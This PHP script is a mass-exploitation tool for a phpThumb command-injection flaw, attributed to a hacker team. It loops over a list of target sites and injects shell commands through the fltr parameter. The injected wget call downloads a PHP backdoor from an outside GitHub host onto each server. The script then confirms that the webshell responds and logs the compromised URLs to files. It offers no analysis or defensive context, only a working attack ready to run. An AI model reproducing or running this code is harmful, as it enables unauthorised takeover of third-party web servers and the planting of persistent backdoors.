<?php 
/*  phpThumb Command Injection Mass Exploiter
      D704T Hacker Team | Coded by MantodKaz
 */
 error_reporting(0);
echo "\n";
echo "\e[0;34m#############################################\n";
echo "\e[0;34m#   \e[1;36mphpThumb Command Injection Mass Exploit \e[0;34m#\n";
echo "\e[0;34m#   \e[1;36mD704T Hacker Team                       \e[0;34m#\n";
echo "\e[0;34m#   \e[1;36mCoded by MantodKaz                      \e[0;34m#\n";
echo "\e[0;34m#                                           #\n";
echo "\e[0;34m# \e[1;36mGithub : https://github.com/MantodKaz/    \e[0;34m#\n";
echo "\e[0;34m#############################################\n";
 echo "\n\e[1;37m Ex : http://site.com/[path to phpthumb]/phpthumb/\n\n\n";
   $pthumb = "\e[1;37m[\e[1;35mphpThumb\e[1;37m]";
 echo "$pthumb\n\e[1;36mList URL :\e[1;37m ";
$list = trim(fgets(STDIN));
$tum    = file_get_contents($list);
$site = explode("\n", $tum);

$i = 1;
foreach ($site as $sites) {
    echo "\e[1;36m[" . $i . " / " . count($site) . "]\n";$i++;
$dec = explode(PHP_EOL, $sites);foreach ($dec as $pron) {

foreach ($site as $url){
$url = trim($pron);
      $m = "\e[1;36m$url/phpThumb.php \e[1;32mVULN !!!\n";
      $a = "\e[1;33mTry Up Shell..\n";
      $n = "\e[1;32mUpload Success\n";
      $t = "\e[1;37mYour Access =>\e[1;32m $url/406.php\e[1;37m\n[saved : thumbShell.txt]\n";
      $o = "\e[1;31mFailed Upload Shell\n=> $url\e[1;37m\n[saved : thumbDie.txt]\n";
      $manual = "\e[1;36m[ if under version 1.7.9 you can try to manual execute ! ]\n\n\e[1;37m";
      $d = "\e[1;31m[!] $url\nNotFound [!]\e[1;37m\n";
      }
}
    $cuk = curl_init();
   curl_setopt($cuk, CURLOPT_URL, $url."phpThumb.php?src=file.jpg&fltr[]=blur|9%20-quality%2075%20-interlace%20line%20fail.jpg%20jpeg:fail.jpg;wget%20-S%20https://raw.githubusercontent.com/Mantodkaz/bekdur/main/php/406.php;rm%20406.php.1;touch%20silit.txt;&phpThumbDebug=9");
    curl_setopt($cuk, CURLOPT_RETURNTRANSFER, 1); 
        curl_setopt($cuk, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt ($cuk, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt ($cuk, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($cuk, CURLOPT_TIMEOUT, 10);
    $output = curl_exec($cuk);
        $duaratus = curl_getinfo($cuk, CURLINFO_HTTP_CODE);
    curl_close($cuk);

         $ifblank = curl_init();
       curl_setopt($ifblank, CURLOPT_URL, $url."/silit.txt");
        curl_setopt($ifblank, CURLOPT_FOLLOWLOCATION, 1);
       curl_setopt($ifblank, CURLOPT_RETURNTRANSFER, 1);
       $accessblank = curl_exec($ifblank);
       $cekblank = curl_getinfo($ifblank, CURLINFO_HTTP_CODE);
       if(preg_match_all("", $accessblank) or $cekblank == 200){
           echo "$pthumb $m";
           sleep(0.2);
$vulnlist = 'Vuln.txt';
            $halah = fopen($vulnlist, 'a+') or die('Cannot open file:  '.$vulnlist);
            $seve = $url."/phpThumb.php?src=file.jpg&fltr[]=blur|9%20-quality%2075%20-interlace%20line%20fail.jpg%20jpeg:fail.jpg;dir -al;&phpThumbDebug=9";
            fwrite($halah, "\n".$seve);
            fclose($halah);
       }
    if($duaratus == 200){
    	echo "$pthumb $a";
        sleep (0.2);
      } else if ($duaratus == 404){
       	echo "$pthumb $d";
       }
         $cek = curl_init();
       curl_setopt($cek, CURLOPT_URL, $url."/406.php?mt=up");
        curl_setopt($cek, CURLOPT_FOLLOWLOCATION, 1);
       curl_setopt($cek, CURLOPT_RETURNTRANSFER, 1);
       $ceek = curl_exec($cek);
       if(preg_match_all("/ManToed/", $ceek)){
           echo "$pthumb $n";
           sleep(0.1);
echo "$t";
$save = 'thumbShell.txt';
            $handle = fopen($save, 'a+') or die('Cannot open file:  '.$save);
            $data = $url."/406.php?mt=up";
            fwrite($handle, "\n".$data);
            fclose($handle);
 } 
 if($ceeks == 404) {
 	echo "$pthumb $o";
 sleep (0.1);
 echo "$manual";
$fail = 'thumbDie.txt';
            $matek = fopen($fail, 'a+') or die('Cannot open file:  '.$fail);
            fwrite($matek, "\n".$url);
            fclose($matek);}}

